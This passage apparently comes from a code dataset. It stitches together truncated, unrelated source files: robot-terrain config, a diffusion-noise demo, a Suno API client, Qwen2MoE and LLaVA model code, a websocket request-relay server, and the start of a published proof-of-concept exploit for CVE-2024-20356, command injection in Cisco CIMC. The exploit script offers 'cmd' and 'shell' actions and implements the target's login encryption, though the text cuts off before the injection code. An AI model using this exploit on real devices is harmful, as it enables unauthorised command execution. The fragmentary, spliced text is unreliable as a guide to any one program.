m).\"\"\"\n\n    flat_patch_sampling: dict[str, FlatPatchSamplingCfg] | None = None\n    \"\"\"Dictionary of configurations for sampling flat patches on the sub-terrain. Defaults to None,\n    in which case no flat patch sampling is performed.\n\n    The keys correspond to the name of the flat patch sampling configuration and the values are the\n    corresponding configurations.\n    \"\"\"\n\n\n@configclass\nclass TerrainGeneratorCfg:\n    \"\"\"Configuration for the terrain generator.\"\"\"\n\n    seed: int | None = None\n    \"\"\"The seed for the random number generator. Defaults to None,\n    in which case the seed is not set.\"\"\"\n\n    curriculum: bool = False\n    \"\"\"Whether to use the curriculum mode. Defaults to False.\n\n    If True, the terrains are generated based on their difficulty parameter. Otherwise,\n    they are randomly generated.\n    \"\"\"\n\n    size: tuple[float, float] = MISSING\n    \"\"\"The width (along x) and length (along y) of each sub-terrain (in m).\n\n    Note:\n      This value is passed on to all the sub-terrain configurations.\n    \"\"\"\n\n    border_width: float = 0.0\n    \"\"\"The width of the border around the terrain (in m). Defaults to 0.0.\"\"\"\n\n    num_rows: int = 1\n    \"\"\"Number of rows of sub-terrains to generate. Defaults to 1.\"\"\"\n\n    num_cols: int = 1\n    \"\"\"Number of columns of sub-terrains to generate. Defaults to 1.\"\"\"\n\n    color_scheme: Literal[\"height\", \"random\", \"none\"] = \"none\"\n    \"\"\"Color scheme to use for the terrain. Defaults to \"none\".\n\n    The available color schemes are:\n\n    - \"height\": Color based on the",
    "import numpy as np\nimport pandas as pd\nfrom PIL import Image\nimport math\nimport matplotlib.pyplot as plt\nfrom matplotlib.animation import FuncAnimation\n\ndef sample_points_in_mask(mask, num_points):\n    # Find all the indices where the mask is True\n    mask_indices = np.argwhere(mask)\n    # Randomly choose indices from the list of mask indices\n    chosen_indices = mask_indices[np.random.choice(len(mask_indices), num_points, replace=False)]\n    # Add noise to the chosen indices to sample points between cells\n    noise = np.random.uniform(-0.5, 0.5, size=(num_points, 2))\n    interpolated_points = chosen_indices + noise\n    \n    return interpolated_points\n\ndef compute_linear_noise_schedule(min, max, num):\n    return np.linspace(min, max, num)\n\ndef compute_cosine_noise_schedule(start, end, num, tau=1, clip_min=1e-9):\n    # A gamma function based on cosine function.\n    def cosine_schedule(t):\n        v_start = math.cos(start * math.pi / 2) ** (2 * tau)\n        v_end = math.cos(end * math.pi / 2) ** (2 * tau)\n        output = math.cos((t * (end - start) + start) * math.pi / 2) ** (2 * tau)\n        output = (v_end - output) / (v_end - v_start)\n        return np.clip(output, clip_min, 1.0)\n    # Linearly sample timesteps\n    timesteps = np.linspace(0, 1, num)\n    return np.array([cosine_schedule(t) for t in timesteps])\n\ndef add_noise(x_init, time):\n    \"\"\"\n        Here we are going to add noise to given x_init \n\n        Args: \n            x_init: np.array of shape (N, 2)\n            time: int, the time step\n    \"\"\"\n    T = 1000\n    betas = compute_linear_noise_schedule(1e-4, 1e-3, T)\n    # print(betas[:10])\n    # betas = compute_cosine_noise_schedule(0, 1, 1000)\n    alphas = 1 - betas\n    # Sample standard gaussian noise\n    noise = np.random.randn(*x_init.shape)\n    # Compute variance\n    standard_deviation = (1 - np.prod(alphas[:time])) ** 0.5 # From the DDPM paper, the variance is one minus the product of the alphas up to t\n    assert np.all(np.prod(alphas[:time]) >= 0), np.prod(alphas[:time])\n    assert not np.isnan(np.prod(alphas[:time]) ** 0.5)\n    mean = np.prod(alphas[:time]) ** 0.5 * x_init\n    # Ensure none are nan\n    assert not np.isnan(standard_deviation)\n    assert not np.isnan(mean).any()\n\n    return mean + standard_deviation * noise\n\ndef make_scatter_plot_animation():\n    # Generate random data points\n    np.random.seed(0)\n    n_points = 100\n    x_data = np.random.rand(n_points)\n    y_data = np.random.rand(n_points)\n    z_data = np.random.rand(n_points) * 100  # Color data\n\n    fig, ax = plt.subplots()\n    sc = ax.scatter(x_data, y_data, c=z_data, cmap='viridis', s=100, alpha=0.6)\n\n    def update(frame):\n        # Update data points\n        x_data = np.random.rand(n_points)\n        y_data = np.random.rand(n_points)\n        z_data = np.random.rand(n_points) * 100\n        # Update scatter plot\n        sc.set_offsets(np.column_stack((x_data, y_data)))\n        sc.set_array(z_data)\n        \n        return sc,\n\n    # Create animation\n    ani = FuncAnimation(fig, update, frames=range(100), interval=200)\n    # Save the animation as a video file\n    ani.save('scatter_animation.mp4', writer='ffmpeg')\n\n    plt.show()\n\nif __name__ == \"__main__\":\n    # Import the mask image\n    image = Image.open(\"mask.png\").convert(\"L\")\n    # Convert it to a binary mask\n    mask = 1 - (np.array(image) > 128).astype(np.float32)\n    # Flip horizontally and transpose\n    mask = np.flip(mask, axis=0).T\n    # Sample points uniformly in the mask\n    num_points = 8000\n    noise_free_data = sample_points_in_mask(mask, num_points)\n    # Rescale the points to be between -4 and 4\n    noise_free_data = (noise_free_data - noise_free_data.min(axis=0)) / (noise_free_data.max(axis=0) - noise_free_data.min(axis=0)) * 6 - 3\n    # Create a pandas data frame containing samples of the spiral function data over different time scales\n    for time in range(0, 1000):\n        noisy_data = add_noise(noise_free_data, time)\n        # CLip to a range of -3 to 3\n        noisy_data = np.clip(noisy_data, -4, 4)\n        # Add the time column\n        noisy_data = np.append(noisy_data, np.ones((noisy_data.shape[0], 1)) * time, axis=1)\n        # Add the noisy data to the data frame\n        if time == 0:\n            df = pd.DataFrame(noisy_data, columns=['x', 'y', 'time'])\n        else:\n            df = pd.concat([df, pd.DataFrame(noisy_data, columns=['x', 'y', 'time'])], axis=0)\n\n    fig, ax = plt.subplots(figsize=(15, 3))\n    sc = ax.scatter(\n        df.loc[df['time'] == 999, 'x'], \n        df.loc[df['time'] == 999, 'y'],\n        cmap='viridis', \n        s=5, \n        alpha=0.8,\n        edgecolors='none'\n    )\n    # set x and y limits\n    ax.set_xlim(-4, 4)\n    ax.set_ylim(-4, 4)\n\n    def update(frame):\n        # Update data points\n        x_data = df.loc[df['time'] == 1000 - frame, 'x']\n        y_data = df.loc[df['time'] == 1000 - frame, 'y']\n        # Update scatter plot\n        sc.set_offsets(np.column_stack((x_data, y_data)))\n        \n        return sc,\n\n    ",
    "# -*- coding:utf-8 -*-\n\nimport json\nimport os\nimport time\n\nimport requests\n\nCOMMON_HEADERS = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n    # \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\",\n    \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36\",\n    # \"User-Agent\": \"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\",\n    \"Referer\": \"https://suno.com/\",\n    \"Origin\": \"https://suno.com\",\n}\n\nBASE_URL = \"https://studio-api.suno.ai\"\n\ndef fetch(url, headers=None, data=None, method=\"POST\"):\n    if headers is None:\n        headers = {}\n    headers.update(COMMON_HEADERS)\n    if data is not None:\n        data = json.dumps(data)\n\n    try:\n        resp = None\n        if method == \"GET\":\n            resp = requests.get(url=url, headers=headers)\n        else:\n            resp = requests.post(url=url, headers=headers, data=data)\n        if resp.status_code != 200:\n            print(resp.text)\n        return resp.json()\n    except Exception as e:\n        return {\"detail\":str(e)}\n\n\ndef get_feed(ids, token):\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    api_url = f\"{BASE_URL}/api/feed/?ids={ids}\"\n    response = fetch(api_url, headers, method=\"GET\")\n    return response\n\ndef get_page_feed(page, token):\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    # api_url = f\"{BASE_URL}/api/feed/?ids={ids}\"\n    api_url = f\"{BASE_URL}/api/feed/?page={page}\"\n    response = fetch(api_url, headers, method=\"GET\")\n    return response\n\n\ndef generate_music(data, token):\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    api_url = f\"{BASE_URL}/api/generate/v2/\"\n    response = fetch(api_url, headers, data)\n    return response\n\n\ndef generate_lyrics(prompt, token):\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    api_url = f\"{BASE_URL}/api/generate/lyrics/\"\n    data = {\"prompt\": prompt}\n    return fetch(api_url, headers, data)\n\n\ndef get_lyrics(lid, token):\n    headers = {\"Authorization\": f\"Bearer {token}\"}\n    api_url = f\"{BASE_URL}/api/generate/lyrics/{lid}\"\n    return fetch(api_url, headers, method=\"GET\")\n\ndef local_time():\n    return  time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime())\n\ndef check_url_available(url: str):\n    while True:\n        # \u6bcf\u95f4\u9694\u4e00\u79d2\u949f\u68c0\u67e5\u4e00\u6b21url\u6587\u4ef6\u5927\u5c0f\n        file_size = get_file_size(url)\n        if file_size >= 1024*1024:\n            print(local_time() + f\" ***check_url_available -> {url} \u6587\u4ef6\u5927\u5c0f\uff1a{file_size} \u5927\u4e8e1MB\u53ef\u8bbf\u95ee\u5230***\\n\")\n            break\n        print(local_time() + f\" ***check_url_available -> {url} \u6587\u4ef6\u5927\u5c0f\uff1a{file_size} \u5c0f\u4e8e1MB\u7ee7\u7eed\u68c0\u67e5***\\n\")\n        time.sleep(1)\n\ndef get_file_size(url):\n    resp = requests.head(url)\n    if resp.status_code == 200:\n        file_size = resp.headers.get('Content-Length')\n        if file_size:\n            return int(file_size)\n    return 0",
    "#!/usr/bin/python3\r\n\"\"\"\r\nExploit for CVE-2024-20356: Command Injection in Cisco CIMC\r\nAaron Thacker @ LRQA Nettitude 2024\r\n\r\nFull details can be found at https://labs.nettitude.com/blog/cve-2024-20356-jailbreaking-a-cisco-appliance-to-run-doom\r\n\r\nThis proof-of-concept is for demonstration purposes and should not be used for illegal activities. LRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.\r\n\r\nUsage: CVE-2024-20356.py [-h] -t HOST -u USERNAME -p PASSWORD [-a ACTION] [-c CMD] [-v]\r\noptions:\r\n  -h, --help            show this help message and exit\r\n  -t HOST, --host HOST  target hostname or IP address (format 10.0.0.1 or 10.0.0.2:1337)\r\n  -u USERNAME, --username USERNAME\r\n                        Username (default: admin)\r\n  -p PASSWORD, --password PASSWORD\r\n                        Password (default: cisco)\r\n  -a ACTION, --action ACTION\r\n                        Action: test, cmd, shell, dance (default: test)\r\n  -c CMD, --cmd CMD     OS command to run (Default: NONE)\r\n  -v, --verbose         Displays more information about cimc\r\n\r\n\"\"\"\r\n\r\nimport Crypto.Random\r\nimport Crypto.Cipher\r\nimport base64\r\nimport hashlib\r\nimport hmac\r\nimport requests\r\nimport urllib3\r\nfrom Crypto.Cipher import AES\r\nimport urllib.parse\r\nimport re\r\nimport xml.etree.ElementTree as ET\r\nimport argparse\r\nimport random\r\nimport time\r\n\r\n# Set to \"127.0.0.1:8080\" to use a proxy\r\nproxy = None\r\n\r\n# derrived from /lib/thirdparty/thirdparty.js\r\ndef hashFnv32(a, b):\r\n\tb = bytes(b, encoding='ascii')\r\n\te = 40389\r\n\th = a[0:32]\r\n\tf = len(h)//4\r\n\tfor i in range (0, f):\r\n\t\te = e ^ ord(a[i])\r\n\t\te = e + (e << 1)\r\n\treturn hmac.new(bytes(str(e), encoding='ascii'), b, hashlib.sha512).hexdigest()\r\n\r\n# derrived from /lib/thirdparty/thirdparty.js\r\ndef keyFnv32(a):\r\n\te = 40389\r\n\th = a[0:32]\r\n\tf = len(h)//4\r\n\tfor i in range (0, f):\r\n\t\te = e ^ ord(a[i])\r\n\t\te = e + (e << 1)\r\n\te = str(e)\r\n\treturn e\r\n\r\n# derrived from CryptoJS\r\ndef derive_key_and_iv(secret):\r\n\tsalt = Crypto.Random.new().read(8)\r\n\tsecret = bytes(secret, encoding='ascii')\r\n\tkeylen = 32\r\n\tivlen = 16\r\n\tsecret += salt\r\n\tk = hashlib.md5(secret).digest()\r\n\tw = k \r\n\twhile len(w) < (keylen + ivlen):\r\n\t\tk = hashlib.md5(k + secret).digest()\r\n\t\tw += k\r\n\treturn  w[:keylen], w[keylen:keylen+ivlen], salt\r\n\r\ndef pad(data):\r\n\tBLOCK_SIZE = 16\r\n\treturn data+(BLOCK_SIZE-len(data)%BLOCK_SIZE)*chr(BLOCK_SIZE-len(data)%BLOCK_SIZE)\r\n\r\n# derrived from CryptoJS\r\ndef encrypt(username, password):\r\n\tsecret = str(keyFnv32(username))\r\n\tmsg = password\r\n\tkey, iv, salt = derive_key_and_iv(secret)\r\n\taes = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_CBC, iv)\r\n\tpadded_msg = bytes(pad(msg), encoding='ascii')\r\n\tencrypted_msg = aes.encrypt(padded_msg)\r\n\treturn base64.b64encode(b\"Salted__\" + salt + encrypted_msg)\r\n\r\n\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\ndef headers():\r\n\tprint(\"\"\"\r\n   _____ _____  _____  _____                    \r\n  / ____|_   _|/ ____|/ ____|                   \r\n | |      | | | (___ | |     _____      ___ __  \r\n | |      | |  \\___ \\| |    / _ \\ \\ /\\ / / '_ \\ \r\n | |____ _| |_ ____) | |___| (_) \\ V  V /| | | |\r\n  \\_____|_____|_____/ \\_____\\___/ \\_/\\_/ |_| |_|\r\n                                                                              \r\n\t\t\"\"\")\r\n\tprint(\"~ Because every vulnerability needs a cool tool\")\r\n\tprint(\"~ AThacker @ LRQA Nettitude | v1.0\\n\")\r\n\tprint(\"This proof-of-concept is for demonstration purposes and should not be used for illegal activities.\\nLRQA Nettitude are not responsible for any damage caused by the use or misuse of this code.\")\r\n\r\n\r\ndef login(target, username, password):\r\n\tenc_password = encrypt(username, password)\r\n\r\n\treq = requests.post(f\"https://{target}/data/login\",\r\n\t\theaders={'Referer':f'https://{target}/login.html','Accept-Encoding': 'identity'},\r\n\t\tproxies={\"https\":proxy,\"http\":proxy},\r\n\t\tverify=False,\r\n\t\tdata={\"user\":username,\"password\":enc_password}\r\n\t)\r\n\r\n\troot = ET.fromstring(req.content)\r\n\tif root.find('authResult').text == '0':\r\n\t\tsidValue = root.find('sidValue').text\r\n\t\tadminUser = True if root.find('adminUser').text == '1' else False\r\n\t\tcookieValue = re.search('sessionCookie=([a-z0-9]{32});', req.headers['Set-Cookie']).group(1)\r\n\t\tprint(f\"sidValue: {sidValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX\")\r\n\t\tprint(f\"cookieValue: {cookieValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX\")\r\n\t\tprint(f\"Admin user: {adminUser}\")\r\n\t\treturn (True, cookieValue, sidValue, adminUser)\r\n\telse:\r\n\t\treturn (False, None, None, None)\r\n\r\ndef logout(target, sidValue):\r\n\tprint(f\"Logging out: {sidValue[0:8]}XXXXXXXXXXXXXXXXXXXXXXXX\")\r\n\treq = requests.post(f\"https://{target}/data/logout\",\r\n\t\theaders={'Referer':f'https://{target}/index.html','Accept-Encoding': 'identity'},\r\n\t\tproxies={\"https\":proxy,\"http\":proxy},\r\n\t\tverify=False,\r\n\t\tdata={\"sessionID\":sidValue}\r\n\t)\r\n\treturn None\r\n\r\ndef query(target, cookieValue, sidValue, input_cmd):\r\n\tres = query_raw(target, cookieValue, sidValue, input_cmd)\r\n\treturn ET.fromstring(res.content)\r\n\r\ndef query_raw(target, cookieValue, ",
    "#!/usr/bin/python3\n# coding:utf-8\n\n# @Time    : 2024/4/9 15:37\n# @Author  : E0tk1\n# @File    : server.py\n# @IDE     : PyCharm\n\nimport json\nimport asyncio\nimport websockets\nfrom flask import Flask, request, jsonify, make_response\nfrom threading import Thread\nfrom urllib.parse import unquote\nimport time\nimport random\nimport string\n\n\ndef generate_random_string(length=32):\n    characters = string.ascii_lowercase + string.digits\n    return ''.join(random.choice(characters) for _ in range(length))\n\n\ndef req_handle(verChar):\n    print(\"-----------------------------------------------------------------------------------------------\")\n    try:\n        hmethod = request.get_json()[\"method\"]\n        hurl = request.get_json()[\"url\"]\n        htype = request.get_json()[\"type\"]\n        try:\n            hheader = request.get_json()[\"header\"]\n        except:\n            hheader = \"\"\n        if htype == \"json\":\n            hdata = unquote(request.query_string.decode('utf-8')[5:])\n        else:\n            hdata = request.get_json()[\"data\"]\n        data = \"{}[][][][][][]{}[][][][][][]{}[][][][][][]{}[][][][][][]{}\".format(hmethod, hurl, htype, hdata, hheader)\n        print(\"\u8bf7\u6c42\u4fe1\u606f\uff1a\")\n        # print(\"\u6821\u9a8c\u7801\uff1a\" + verChar)\n        print(\"Method\uff1a{}\".format(hmethod))\n        print(\"URL\uff1a{}\".format(hurl))\n        print(\"Content-type\uff1a{}\".format(htype))\n        print(\"Headers\uff1a{}\".format(hheader))\n        print(\"Data\uff1a{}\".format( hdata))\n        data = verChar + \"------------\" + str(data)\n        return data\n    except:\n        print(\"\u53d1\u9001\u7ed9web\u5ba2\u6237\u7aef\u7684\u6d88\u606f\uff1a\\ndata\u6570\u636e\u9519\u8bef\")\n        print(\"-----------------------------------------------------------------------------------------------\")\n        return None\n\n\napp = Flask(__name__)\ntry:\n    app.json.ensure_ascii = False               # \u89e3\u51b3json\u4e2d\u6587\u4e71\u7801\u95ee\u9898(flask 2.3.0\u4ee5\u4e0a)\nexcept:\n    app.config['JSON_AS_ASCII'] = False         # \u89e3\u51b3json\u4e2d\u6587\u53d8Unicode\u7f16\u7801(flask 2.2.5\u4ee5\u4e0b)\nconnected_clients = set()\nloop = None  # \u5b58\u50a8\u4e8b\u4ef6\u5faa\u73af\u5f15\u7528\n\nmessage = \"\"\nlast_connect = None\n\n\n@app.route('/api', methods=['POST'])\ndef receive_data():\n    verChar = str(generate_random_string())\n    data = req_handle(verChar)\n    if not data:\n        return \"data\u6570\u636e\u9519\u8bef\"\n    if loop is not None and last_connect:\n        loop.call_soon_threadsafe(send_data_to_client, last_connect, data)\n    else:\n        print(\"ws\u5ba2\u6237\u7aef\u672a\u8fde\u63a5\")\n        return \"ws\u5ba2\u6237\u7aef\u672a\u8fde\u63a5\"\n    start_time = time.time()\n    while time.time() - start_time < 2:\n        try:\n            messages1 = message.split(\"------------\")\n            newmessages0 = messages1[0]     # \u8fd4\u56de\u7684\u6821\u9a8c\u7801\n            newmessages1 = messages1[1]     # \u8fd4\u56de\u7684\u72b6\u6001\u7801\n            newmessages2 = messages1[2]     # \u8fd4\u56de\u7684\u54cd\u5e94\u5934\n            newmessages3 = messages1[3]     # \u8fd4\u56de\u7684\u54cd\u5e94\u4f53\n            if verChar == newmessages0:\n                print(\"\u54cd\u5e94\u4fe1\u606f\uff1a\")\n                print(\"Code\uff1a\" + str(newmessages1))\n                print(\"Headers\uff1a\" + newmessages2)\n                print(\"Data\uff1a\" + newmessages3)\n                print(\"-----------------------------------------------------------------------------------------------\")\n\n                if newmessages2 == \"0\" and newmessages3 == \"0\":\n                    return \"\u7f51\u7ad9\u8bbf\u95ee\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\\n1\u3001URL\u662f\u5426\u6b63\u786e\uff01\\n2\u3001\u662f\u5426\u5b58\u5728\u8de8\u57df\u8bbf\u95ee\\n3\u3001\u7f51\u7ad9\u662f\u5426\u80fd\u6b63\u5e38\u8bbf\u95ee\"\n                newheaders = json.loads(newmessages2)\n\n                response = make_response(newmessages3, int(newmessages1))\n                for key, value in newheaders.items():\n                    response.headers[key] = value\n                return response\n        except:\n            time.sleep(0.1)\n    print(\"\u53d1\u9001\u7ed9web\u5ba2\u6237\u7aef\u7684\u6d88\u606f\uff1a\\n\u53d1\u9001\u7ed9\u4e86ws\u5ba2\u6237\u7aef\uff0c\u4f46\u662f\u6ca1\u6709\u8fd4\u56de\uff01\\n\u8bf7\u68c0\u67e5\uff1a\\n1\u3001\u7f51\u7ad9\u8bbf\u95ee\u65f6\u95f4\u662f\u5426\u8d85\u8fc72\u79d2\\n2\u3001ws\u5ba2\u6237\u7aef\u662f\u5426\u65ad\u5f00\u8fde\u63a5\")\n    print(\"-----------------------------------------------------------------------------------------------\")\n    return \"\u53d1\u9001\u7ed9\u4e86ws\u5ba2\u6237\u7aef\uff0c\u4f46\u662f\u6ca1\u6709\u8fd4\u56de\uff01\\n\u8bf7\u68c0\u67e5\uff1a\\n1\u3001\u7f51\u7ad9\u8bbf\u95ee\u65f6\u95f4\u662f\u5426\u8d85\u8fc72\u79d2\\n\u3001ws\u5ba2\u6237\u7aef\u662f\u5426\u65ad\u5f00\u8fde\u63a5\"\n\n\nasync def handle_client(websocket, path):\n    global message, last_connect\n    last_connect = websocket    # \u4fdd\u8bc1\u6d88\u606f\u53ea\u53d1\u9001\u7ed9\u6700\u65b0\u8fde\u63a5\u7684ws\u5ba2\u6237\u7aef\n    connected_clients.add(websocket)\n\n    token = await websocket.recv()\n    if token != 'password=123456':   # ws\u8fde\u63a5\u5bc6\u7801\n        await websocket.close()\n        return\n\n    client_address = websocket.remote_address\n\n    try:\n        headers = websocket.request_headers\n        oriin = headers.get('Origin')\n    except:\n        oriin = \"\"\n    print(\"ws\u5ba2\u6237\u7aef\u8fde\u63a5\u6210\u529f\uff0cIP\uff1a{}\uff0c\u7aef\u53e3\uff1a{}\uff0c\u6240\u5728\u7ad9\u70b9\u57df\u540d\uff1a{}\".format(client_address[0], client_address[1], oriin))\n    await websocket.send(\"success!\")\n\n    while True:\n        try:\n            message = await websocket.recv()\n        except websockets.exceptions.ConnectionClosed:\n            connected_clients.remove(websocket)\n            break\n\n\ndef send_data_to_client(websocket, data):\n    try:\n        asyncio.run_coroutine_threadsafe(websocket.send(data), loop)\n    except websockets.exceptions.ConnectionClosed:\n        connected_clients.remove(websocket)\n\n\ndef start_ws_server():\n    global loop\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n    server = websockets.serve(handle_client, \"0.0.0.0\", 8765)\n    loop.run_until_complete(server)\n    loop.run_forever()\n\n\ndef start_flask_app():\n    app.run(",
    "# coding=utf-8\n# Copyright 2024 The Qwen team, Alibaba Group and the HuggingFace Inc. team. All rights reserved.\n#\n# This code is based on EleutherAI's GPT-NeoX library and the GPT-NeoX\n# and OPT implementations in this library. It has been modified from its\n# original forms to accommodate minor architectural differences compared\n# to GPT-NeoX and OPT used by the Meta AI team that trained the model.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" PyTorch Qwen2MoE model.\"\"\"\nimport inspect\nimport math\nimport warnings\nfrom typing import List, Optional, Tuple, Union\n\nimport torch\nimport torch.nn.functional as F\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\n\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache, DynamicCache\nfrom transformers.modeling_attn_mask_utils import _prepare_4d_causal_attention_mask, _prepare_4d_causal_attention_mask_for_sdpa\nfrom transformers.modeling_outputs import ModelOutput, SequenceClassifierOutputWithPast\nfrom transformers.modeling_utils import PreTrainedModel\nfrom transformers.utils import (\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    is_flash_attn_2_available,\n    is_flash_attn_greater_or_equal_2_10,\n    logging,\n    replace_return_docstrings,\n)\nfrom dataclasses import dataclass\nfrom configuration_qwen2_moe import Qwen2MoeConfig\n\n\n\nif is_flash_attn_2_available():\n    from flash_attn import flash_attn_func, flash_attn_varlen_func\n    from flash_attn.bert_padding import index_first_axis, pad_input, unpad_input  # noqa\n\n    _flash_supports_window_size = \"window_size\" in list(inspect.signature(flash_attn_func).parameters)\n\nlogger = logging.get_logger(__name__)\nDEBUG = False\n_CHECKPOINT_FOR_DOC = \"Qwen/Qwen1.5-MoE-A2.7B\"\n_CONFIG_FOR_DOC = \"Qwen2MoeConfig\"\n\nQWEN2MOE_PRETRAINED_MODEL_ARCHIVE_LIST = [\n    \"Qwen/Qwen1.5-MoE-A2.7B\",\n    # See all Qwen2 models at https://huggingface.co/models?filter=qwen2\n]\n\n# Override MoeModelOutputWithPast and MoeCausalLMOutputWithPast to include the M and Z values for InfiniAttention\n@dataclass\nclass MoeModelOutputWithPast(ModelOutput):\n    \"\"\"\n    Base class for model's outputs, with potential hidden states and attentions.\n\n    Args:\n        last_hidden_state (`torch.FloatTensor` of shape `(batch_size, sequence_length, hidden_size)`):\n            Sequence of hidden-states at the output of the last layer of the model.\n        past_key_values (`tuple(tuple(torch.FloatTensor))`, *optional*, returned when `use_cache=True` is passed or when `config.use_cache=True`):\n            Tuple of `tuple(torch.FloatTensor)` of length `config.n_layers`, with each tuple having 2 tensors of shape\n            `(batch_size, num_heads, sequence_length, embed_size_per_head)`) and optionally if\n            `config.is_encoder_decoder=True` 2 additional tensors of shape `(batch_size, num_heads,\n            encoder_sequence_length, embed_size_per_head)`.\n\n            Contains pre-computed hidden-states (key and values in the self-attention blocks and optionally if\n            `config.is_encoder_decoder=True` in the cross-attention blocks) that can be used (see `past_key_values`\n            input) to speed up sequential decoding.\n        hidden_states (`tuple(torch.FloatTensor)`, *optional*, returned when `output_hidden_states=True` is passed or when `config.output_hidden_states=True`):\n            Tuple of `torch.FloatTensor` (one for the output of the embeddings, if the model has an embedding layer, +\n            one for the output of each layer) of shape `(batch_size, sequence_length, hidden_size)`.\n\n            Hidden-states of the model at the output of each layer plus the optional initial embedding outputs.\n        attentions (`tuple(torch.FloatTensor)`, *optional*, returned when `output_attentions=True` is passed or when `config.output_attentions=True`):\n            Tuple of `torch.FloatTensor` (one for each layer) of shape `(batch_size, num_heads, sequence_length,\n            sequence_length)`.\n\n            Attentions weights after the attention softmax, used to compute the weighted average in the self-attention\n            heads.\n        router_logits (`tuple(torch.FloatTensor)`, *optional*, returned when `output_router_probs=True` and `config.add_router_probs=True` is passed or when `config.output_router_probs=True`):\n            Tuple of `torch.FloatTensor` (one for each layer) of shape `(batch_size, sequence_length, num_experts)`.\n\n            R",
    "from PIL import Image\nfrom io import BytesIO\nimport base64\nimport torch\nimport math\nimport ast\n\nfrom transformers import StoppingCriteria\nfrom llava.constants import IMAGE_TOKEN_INDEX\n\n\ndef select_best_resolution(original_size, possible_resolutions):\n    \"\"\"\n    Selects the best resolution from a list of possible resolutions based on the original size.\n\n    Args:\n        original_size (tuple): The original size of the image in the format (width, height).\n        possible_resolutions (list): A list of possible resolutions in the format [(width1, height1), (width2, height2), ...].\n\n    Returns:\n        tuple: The best fit resolution in the format (width, height).\n    \"\"\"\n    original_width, original_height = original_size\n    best_fit = None\n    max_effective_resolution = 0\n    min_wasted_resolution = float('inf')\n\n    for width, height in possible_resolutions:\n        scale = min(width / original_width, height / original_height)\n        downscaled_width, downscaled_height = int(original_width * scale), int(original_height * scale)\n        effective_resolution = min(downscaled_width * downscaled_height, original_width * original_height)\n        wasted_resolution = (width * height) - effective_resolution\n\n        if effective_resolution > max_effective_resolution or (effective_resolution == max_effective_resolution and wasted_resolution < min_wasted_resolution):\n            max_effective_resolution = effective_resolution\n            min_wasted_resolution = wasted_resolution\n            best_fit = (width, height)\n\n    return best_fit\n\n\ndef resize_and_pad_image(image, target_resolution):\n    \"\"\"\n    Resize and pad an image to a target resolution while maintaining aspect ratio.\n\n    Args:\n        image (PIL.Image.Image): The input image.\n        target_resolution (tuple): The target resolution (width, height) of the image.\n\n    Returns:\n        PIL.Image.Image: The resized and padded image.\n    \"\"\"\n    original_width, original_height = image.size\n    target_width, target_height = target_resolution\n\n    scale_w = target_width / original_width\n    scale_h = target_height / original_height\n\n    if scale_w < scale_h:\n        new_width = target_width\n        new_height = min(math.ceil(original_height * scale_w), target_height)\n    else:\n        new_height = target_height\n        new_width = min(math.ceil(original_width * scale_h), target_width)\n\n    # Resize the image\n    resized_image = image.resize((new_width, new_height))\n\n    new_image = Image.new('RGB', (target_width, target_height), (0, 0, 0))\n    paste_x = (target_width - new_width) // 2\n    paste_y = (target_height - new_height) // 2\n    new_image.paste(resized_image, (paste_x, paste_y))\n\n    return new_image\n\n\ndef divide_to_patches(image, patch_size):\n    \"\"\"\n    Divides an image into patches of a specified size.\n\n    Args:\n        image (PIL.Image.Image): The input image.\n        patch_size (int): The size of each patch.\n\n    Returns:\n        list: A list of PIL.Image.Image objects representing the patches.\n    \"\"\"\n    patches = []\n    width, height = image.size\n    for i in range(0, height, patch_size):\n        for j in range(0, width, patch_size):\n            box = (j, i, j + patch_size, i + patch_size)\n            patch = image.crop(box)\n            patches.append(patch)\n\n    return patches\n\n\ndef get_anyres_image_grid_shape(image_size, grid_pinpoints, patch_size):\n    \"\"\"\n    Calculate the shape of the image patch grid after the preprocessing for images of any resolution.\n\n    Args:\n        image_size (tuple): The size of the input image in the format (width, height).\n        grid_pinpoints (str): A string representation of a list of possible resolutions.\n        patch_size (int): The size of each image patch.\n\n    Returns:\n        tuple: The shape of the image patch grid in the format (width, height).\n    \"\"\"\n    if type(grid_pinpoints) is list:\n        possible_resolutions = grid_pinpoints\n    else:\n        possible_resolutions = ast.literal_eval(grid_pinpoints)\n    width, height = select_best_resolution(image_size, possible_resolutions)\n    return width // patch_size, height // patch_size\n\n\ndef process_anyres_image(image, processor, grid_pinpoints):\n    \"\"\"\n    Process an image with variable resolutions.\n\n    Args:\n        image (PIL.Image.Image): The input image to be processed.\n        processor: The image processor object.\n        grid_pinpoints (str): A string representation of a list of possible resolutions.\n\n    Returns:\n        torch.Tensor: A tensor containing the processed image patches.\n    \"\"\"\n    if type(grid_pinpoints) is list:\n        possible_resolutions = grid_pinpoints\n    else:\n        possible_resolutions = ast.literal_eval(grid_pinpoints)\n    best_resolution = 